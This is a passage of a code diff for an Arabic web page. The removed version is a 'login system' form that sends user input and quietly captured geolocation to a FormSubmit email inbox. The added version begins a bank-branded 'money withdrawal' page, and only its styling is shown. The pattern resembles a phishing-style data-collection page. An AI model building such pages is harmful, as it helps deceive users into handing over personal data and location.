@@ -1,143 +1,156 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>منظومة تسجيل الدخول (FormSubmit)</title>
-  <script src="https://accounts.google.com/gsi/client" async defer></script>
-  <style>
-    body { font-family: Arial, sans-serif; background: linear-gradient(to right, #2c3e50, #3498db); color: white;
-      display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; padding:20px; }
-    form { background: rgba(0,0,0,0.45); padding:22px; border-radius:10px; width:360px; box-sizing:border-box; text-align:center; }
-    input[type="text"], input[type="email"], textarea { width:100%; padding:10px; margin:8px 0; border-radius:6px; border:none; font-size:15px; box-sizing:border-box; }
-    button { width:100%; padding:10px; background:#1abc9c; border:none; border-radius:6px; color:white; font-size:16px; cursor:pointer; }
-    .message { margin-top:12px; font-size:14px; min-height:20px; }
-    .checkbox-container { display:flex; gap:8px; align-items:center; justify-content:flex-start; font-size:13px; margin:10px 0; }
-    .google-button { margin-bottom:12px; display:flex; justify-content:center; }
-    small.note { display:block; color:#ecf0f1; opacity:0.9; margin-top:6px; }
-  </style>
-</head>
-<body>
-
-  <!--
-    ملاحظة هامة: استبدل youremail@example.com بالبريد الذي تريد أن يصلك عليه النموذج.
-    مثال: action="https://formsubmit.co/me@domain.com"
-  -->
-  <form id="dataForm" action="https://formsubmit.co/youremail@example.com" method="POST">
-    <h2>منظومة تسجيل الدخول</h2>
-
-    <!-- زر تسجيل الدخول بجوجل (اختياري، يتطلب Client ID صالح) -->
-    <div class="google-button" id="g_id_signin"></div>
-
-    <input type="text" name="contact" id="contact" placeholder="اكتب بريد أو اسم مستخدم" required />
-    <!-- لقد استبدلت حقل كلمة السر بحقل ملاحظة آمنة -- لا ترسل كلمات مرور حقيقية -->
-    <textarea name="note" id="note" rows="3" placeholder="ملاحظة (لا ترسل كلمات سر حقيقية)"></textarea>
-
-    <input type="hidden" name="latitude" id="latitude" />
-    <input type="hidden" name="longitude" id="longitude" />
-
-    <div class="checkbox-container">
-      <input type="checkbox" id="privacyCheck" required />
-      <label for="privacyCheck">أوافق على سياسة الخصوصية</label>
-    </div>
-
-    <!-- إعدادات FormSubmit -->
-    <!-- تعطيل الكابتشا الداخلية (إذا أردت تفعيلها ضع true) -->
-    <input type="hidden" name="_captcha" value="false">
-    <!-- بعد الإرسال يتم إعادة التوجيه إلى صفحة شكر (يمكن تغييره) -->
-    <input type="hidden" name="_next" value="https://example.com/thank-you.html">
-    <!-- عرض الرسالة في شكل جدول داخل البريد -->
-    <input type="hidden" name="_template" value="table">
-
-    <button type="submit">حفظ البيانات</button>
-
-    <div class="message" id="message"></div>
-    <small class="note">ملاحظة: لا تجمع أو تطلب كلمات مرور حقيقية من المستخدمين. إن كنت تحتاج نظام تسجيل دخول فعلي، سأرشدك إلى طرق آمنة.</small>
-  </form>
-
-  <script>
-    // جلب الموقع الجغرافي وملئ الحقول
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          document.getElementById('latitude').value = pos.coords.latitude.toFixed(6);
-          document.getElementById('longitude').value = pos.coords.longitude.toFixed(6);
-        },
-        err => {
-          console.warn('لم يتم الحصول على الموقع:', err.message);
-        },
-        { timeout: 10000 }
-      );
-    }
-
-    // تحقق بصري قبل الإرسال: تأكد أن الحقول المطلوبة ممتلئة
-    const form = document.getElementById('dataForm');
-    const messageDiv = document.getElementById('message');
-
-    form.addEventListener('submit', function(e) {
-      // فحص بسيط واظهار رسالة تأكيد قبل الإرسال
-      messageDiv.style.color = 'white';
-      messageDiv.textContent = 'يتم إرسال البيانات...';
-
-      // هنا نسمح بالإرسال الطبيعي (FormSubmit يتعامل مع POST)
-      // لكن نتحقق: الحقل contact لا يجب أن يكون فارغا
-      const contact = document.getElementById('contact').value.trim();
-      const privacy = document.getElementById('privacyCheck').checked;
-      if (!contact) {
-        e.preventDefault();
-        messageDiv.style.color = '#e74c3c';
-        messageDiv.textContent = 'الرجاء كتابة البريد أو اسم المستخدم.';
-        return;
-      }
-      if (!privacy) {
-        e.preventDefault();
-        messageDiv.style.color = '#e74c3c';
-        messageDiv.textContent = 'يجب الموافقة على سياسة الخصوصية.';
-        return;
-      }
-
-      // بعد الإرسال، FormSubmit سيعيد توجيه المستخدم إلى الرابط في _next
-      // لا نقوم بإرسال كلمات مرور — هذا تحذير أمني ضمني
-    });
-
-    // Google Sign-In: إذا أردت تفعيلها ضع Client ID صالح في initialize
-    window.onload = function () {
-      if (window.google && google.accounts && typeof google.accounts.id === 'object') {
-        try {
-          google.accounts.id.initialize({
-            client_id: "YOUR_GOOGLE_CLIENT_ID", // <-- ضع هنا مفتاحك إن أردت تفعيل
-            callback: handleCredentialResponse
-          });
-          google.accounts.id.renderButton(
-            document.getElementById("g_id_signin"),
-            { theme: "outline", size: "large", text: "signin_with" }
-          );
-        } catch (e) {
-          console.warn('مشكل في تهيئة Google Sign-In:', e.message);
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سحب مالي - المصرف العربي</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-      }
-    };
-
-    function handleCredentialResponse(response) {
-      try {
-        const jwt = parseJwt(response.credential);
-        const email = jwt.email || '';
-        if (email) document.getElementById('contact').value = email;
-      } catch (e) {
-        console.warn('خطأ في قراءة بيانات Google:', e.message);
-      }
-    }
-
-    function parseJwt(token) {
-      const base64Url = token.split('.')[1];
-      const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
-      const jsonPayload = decodeURIComponent(atob(base64).split('').map(function (c) {
-          return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-      }).join(''));
-      return JSON.parse(jsonPayload);
-    }
-  </script>
-
-</body>
-</html>
-
+        
+        body {
+            background-color: #f5f7fa;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 40px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background-color: #1a5f7a;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 24px;
+        }
+        
+        h1 {
+            color: #1a5f7a;
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #444;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        input:focus, select:focus {
+            border-color: #1a5f7a;
+            outline: none;
+        }
+        
+        .amount-input {
+            position: relative;
+        }
+        
+        .currency {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+        }
+        
+        .amount-input input {
+            padding-left: 50px;
+        }
+        
+        .quick-amounts {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+        
+        .amount-btn {
+            flex: 1;
+            margin: 0 5px;
+            padding: 10px;
+            background-color: #f0f4f8;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .amount-btn:hover {
+            background-color: #e4e9f0;
+        }
+        
+        .amount-btn.active {
+            background-color: #1a5f7a;
+            color: white;
+            border-color: #1a5f7a;
+        }
+        
+        .account-info {
+            background-color: #f9f9f9;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+        }
+        
+        .account-details {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+        
+        .account-details span {
+            font-weight: 600;
+        }
+        
+        .withdraw-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #1a5f7a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
